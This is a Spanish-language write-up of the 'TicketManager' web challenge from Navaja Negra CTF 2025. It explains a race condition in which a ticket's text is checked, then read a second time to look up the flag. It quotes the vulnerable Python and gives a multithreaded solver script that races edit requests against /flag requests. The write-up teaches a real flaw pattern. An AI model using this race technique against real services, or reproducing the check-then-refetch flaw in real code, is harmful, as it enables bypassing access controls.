# TicketManager

> Navaja Negra CTF 2025

> 02/10/2025 09:00 CEST - 04/10/2025 11:00 CEST

* Categoría: Web
* Autor: eljoselillo7
* Dificultad: ★★☆
* Etiquetas: Condición de carrera

## Descripción

    Un gestor de tickets ligero y aparentemente inocente… Puedes guardar, editar y borrar tus textos como quieras. Fácil, ¿no? 🤔

## Archivos

    TicketManager.zip

## Resolución

La aplicación ofrece un sistema sencillo de gestión de tickets, permitiendo crear, modificar y eliminar entradas. El objetivo es conseguir que la aplicación nos devuelva una flag, la cual solo puede obtenerse si un ticket contiene únicamente la palabra `"flag"`.

Sin embargo, existe una validación que bloquea directamente la ejecución si detecta la cadena `"flag"` en el contenido, lo que en principio hace que el reto parezca imposible. Se deberá de explotar una condición de carrera para conseguir la flag.

### Análisis de la vulnerabilidad

El problema radica en cómo la aplicación consulta la base de datos. El flujo simplificado es el siguiente:

```python
entry = get_text(entry_id, user_id)
if entry:
    if "flag" not in entry.content:
        return flag_dict.get(get_text(entry_id, user_id).content, "Key not found")
    else:
        return "You are not allowed to retrieve the flag"
```

La clave está en que se realizan dos consultas consecutivas (`get_text`) sobre el mismo ticket:

1. La primera vez se valida si el texto contiene `"flag"`.
    
2. La segunda vez se utiliza ese mismo texto como clave para recuperar la flag.

La función `get_text` es:

```python
def get_text(entry_id, user_id):
    entry = TextEntry.query.filter_by(id=entry_id, user_id=user_id).first()
    db.session.refresh(entry)
    return entry
```

Este doble acceso a la base de datos abre la puerta a una race condition, ya que entre la primera y la segunda consulta el contenido puede ser modificado.

### Explotación

La idea es la siguiente:

1. Creamos un ticket con un contenido inicial que no contenga la palabra `"flag"` (para superar la primera comprobación, por ejemplo `"flg"`).

2. Justo después de pasar el primer `if`, pero antes de que se ejecute el segundo `get_text`, modificamos el ticket para que su contenido sí contenga `"flag"`.
    
3. De esta forma, la validación inicial se supera, pero en la segunda consulta el contenido ya habrá cambiado, permitiéndonos acceder al diccionario `flag_dict` y recuperar la flag real.

La forma más fácil de explotar la vulnerabilidad es enviar un gran número de las peticiones HTTP necesarias de manera muy rápida. Para explotar la vulnerabilidad, necesitaremos enviar 3 peticiones diferentes.

- Petición HTTP para modificar el texto del ticket a una palabra que no sea `flag`, por ejemplo `flg`.
- Petición HTTP para modificar el texto del ticket a la palabra  `flag`.
- Petición HTTP a `/flag`.

Para ello se puede programar un script con múltiples threads o usar herramientar como la extensión Turbo Intruder de BurpSuite.

Un ejemplo de solución sería el siguiente:

```python
#!/usr/bin/python3
import sys
from requests import post, get

if len(sys.argv) != 4:
    print("Uso: python3 solver.py <URL_BASE> <COOKIE> <ID_TEXTO_YA_CREADO>")
    print("Ejemplo: python3 solver.py http://example.com:5001 eyc2VyXc2VyXc2VyX.c2VyXc2VyXc2VyXc2VyX.c2VyXc2VyXc2VyX 3")
    sys.exit(1)

BASE_URL = sys.argv[1].rstrip("/")  # Asegura que no termine en "/"
# PONER COOKIE AQUI
token = sys.argv[2]

global_entry_id = sys.argv[3]

N = 10

# Communication with the app
def mod1(token):
  cookies = {"session": token}
  return post("{}/home".format(BASE_URL), cookies=cookies, data={"new_text_{}".format(global_entry_id):"flag","action":"modify_{}".format(global_entry_id)})

def get1(token):
  cookies = {"session": token}
  r = get("{}/flag?id={}".format(BASE_URL, global_entry_id), cookies=cookies)
  if "nnctf" in r.text:
    print(r.text)
  return r


def mod2(token):
  cookies = {"session": token}
  return post("{}/home".format(BASE_URL), cookies=cookies, data={"new_text_{}".format(global_entry_id):"flg","action":"modify_{}".format(global_entry_id)})


# Threads Classes
import threading
import time
class Get1(threading.Thread):
 def run(self):
    while True:
      try:
        get1(token)
      except:
        pass 

class Modi1(threading.Thread):
 def run(self):
    while True:
      try:
        mod1(token)
      except:
        pass

class Modi2(threading.Thread):
 def run(self): 
    while True:
      try:
        mod2(token)
      except:
        pass 

if __name__ == "__main__":
  t1 = []
  for _ in range(N):
    t1.append(Modi1())
    t1[-1].start()
    t1.append(Modi2())
    t1[-1].start()
    t1.append(Get1())
    t1[-1].start()

```

> **flag: nnctf{no_c0rras_t4nt0_am1g0!}**